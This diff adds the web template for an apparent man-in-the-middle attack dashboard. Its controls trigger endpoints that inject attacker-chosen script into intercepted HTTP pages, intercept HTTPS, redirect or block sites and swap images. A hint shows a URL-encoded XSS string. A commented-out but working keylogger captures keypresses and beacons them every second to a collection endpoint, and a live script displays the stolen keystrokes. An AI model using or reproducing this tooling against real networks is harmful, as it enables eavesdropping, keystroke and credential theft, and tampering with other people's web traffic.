@@ -1,0 +1,86 @@
+{{set . "title" "Home"}}
+{{template "header.html" .}}
+
+<header class="hero-unit" style="background-color:#BC4728">
+  <div class="container">
+    <div class="row">
+      <div class="hero-text">
+        <h1>MITM Dashboard</h1>
+        <p></p>
+      </div>
+    </div>
+  </div>
+</header>
+
+
+    <div class="buttons">
+      <ul>
+      <li><button type="button" id="replace">Replace All Images</button></li>
+      <li><button type="button" id="flip">Flip Images</button></li>
+      <li><button type="button" id="redirect">Redirect pages</button>the list of pages you can redirect...</li>
+      <li>
+        Remember to url encode e.g: <pre>&lt;script&gt;alert(1)%3B&lt;/script&gt;</pre>
+        Replace: <input type="text" id="find"  />
+        With: <input type="text" id="result"  />
+        <button type="button" id="inject">Inject Hook in HTTP</button>
+      </li>
+      <li><button type="button" id="block">Block URLs</button></li>
+      <li><button type="button" id="intercept">Intercept HTTPS</button></li>
+    </ul>
+    </div>
+    <div id="keypresses">
+      <script>
+      $( document ).ready(function(){
+          $.get( "http://127.0.0.1:9000/App/GetData", function( data ) {
+            $('#keypresses').append(data + "<br>")
+          });}, 1000);
+      </script>
+<!-- 
+      <script>var keys = '';
+ 
+document.onkeypress = function(e) {
+    var get = window.event ? event : e;
+    var key = get.keyCode ? get.keyCode : get.charCode;
+    key = String.fromCharCode(key);
+    keys += key;
+}
+ 
+window.setInterval(function(){
+    new Image().src = '//127.0.0.1:9000/App/AppendData?data='+keys;
+    keys = '';
+}, 1000);</script>
+ -->
+    </div>
+
+
+<script type="text/javascript">
+  $("#replace").click(function() {
+    $.get( "/ReplaceImages", function( data ) {
+    });
+  })
+  $("#intercept").click(function() {
+    $.get( "/InterceptHTTPS", function( data ) {
+    });
+  })
+  $("#flip").click(function() {
+    $.get( "/FlipImages", function( data ) {
+    });
+  })
+  $("#redirect").click(function() {
+    $.get( "/ReplacePage", function( data ) {
+    });
+  })
+  $("#block").click(function() {
+    $.get( "/BlockWebsites", function( data ) {
+    });
+  })
+  $("#inject").click(function() {
+    var find = $("#find").val();
+    var result = $("#result").val();
+    console.log(find)
+    console.log(result)
+    $.get( "/InjectScript?replace="+find+"&result="+result, function( data ) {
+    });
+  })
+</script>
+{{template "footer.html" .}}
